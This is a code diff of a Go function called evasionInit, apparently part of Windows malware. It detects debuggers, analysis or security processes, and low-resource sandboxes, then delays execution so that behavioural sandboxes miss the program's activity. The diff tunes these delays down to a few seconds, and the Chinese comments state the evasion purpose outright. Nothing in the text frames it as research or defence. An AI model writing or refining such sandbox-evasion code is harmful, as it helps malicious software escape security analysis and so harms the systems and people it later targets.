@@ -24,7 +24,7 @@ func evasionInit() {
 	isDbg := resolveAPI("kernel32.dll", "IsDebuggerPresent")
 	if err := isDbg.Find(); err == nil {
 		if r, _, _ := isDbg.Call(); r != 0 {
-			delay += 15 * time.Second
+			delay += 3 * time.Second
 		}
 	}
 
@@ -47,8 +47,9 @@ func evasionInit() {
 		for e := windows.Process32First(snap, &pe); e == nil; e = windows.Process32Next(snap, &pe) {
 			name := strings.ToLower(windows.UTF16ToString(pe.ExeFile[:]))
 			for _, s := range suspects {
+
 				if strings.Contains(name, s) {
-					delay += 25 * time.Second
+					delay += 5 * time.Second
 					goto resourceCheck
 				}
 			}
@@ -58,20 +59,21 @@ func evasionInit() {
 resourceCheck:
 	// 3. 资源特征：CPU < 2 核或物理内存 < 2GB（典型沙箱低配配置）
 	if runtime.NumCPU() < 2 {
-		delay += 15 * time.Second
+		delay += 3 * time.Second
 	}
 	gms := resolveAPI("kernel32.dll", "GlobalMemoryStatusEx")
 	if err := gms.Find(); err == nil {
 		m := &memoryStatusEx{Length: uint32(unsafe.Sizeof(memoryStatusEx{}))}
 		if r, _, _ := gms.Call(uintptr(unsafe.Pointer(m))); r != 0 && m.TotalPhys > 0 && m.TotalPhys < 2*1024*1024*1024 {
-			delay += 15 * time.Second
+			delay += 3 * time.Second
 		}
 	}
 
-	// 4. 随机运行延迟：0~20s，打乱自动化/行为沙箱对"启动即连/即行为"的判定节奏。
-	//    仅当检测到上述分析/安全特征时才叠加随机延迟，正常主机不额外延时。
+	// 4. 随机运行延迟：0~3s，打乱自动化/行为沙箱对"启动即连/即行为"的判定节奏。
+	//    仅当检测到上述分析/安全特征时才叠加随机延迟；正常主机不额外延时。
+	//    保持轻量：启动随机延迟由配置 startup_delay_min/max 主导，这里只加少量扰动。
 	if delay > 0 {
-		delay += time.Duration(time.Now().UnixNano()%20000) * time.Millisecond
+		delay += time.Duration(time.Now().UnixNano()%3000) * time.Millisecond
 		time.Sleep(delay)
 	}
 }
